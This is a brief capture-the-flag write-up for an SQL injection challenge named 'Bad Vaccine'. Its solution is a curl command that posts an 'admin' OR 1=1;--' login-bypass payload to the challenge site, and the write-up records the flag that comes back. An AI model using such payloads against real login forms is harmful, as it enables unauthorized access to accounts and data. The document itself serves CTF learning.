# Bad Vaccine

**Challenge Type: SQL Injection**

## Challenge
Find out what are the bad vaccines and destroy them.  
http://vaccine.nypinfsecctf.tk/

## Solution
```bash
$ curl --no-progress-meter -X POST -d "username=admin' OR 1=1;--&password=username=admin' OR 1=1" https://vaccine.nypinfsecctf.tk | grep -i "NYP{.*}"

NYP{3z_sQL_iNJ3cTi0n}
```

## Ending Note
The organisers said that it's a very basic SQL Injection. And it is true as you see above.  
However, attempting to use `admin' #` will return you a Status 500 error.
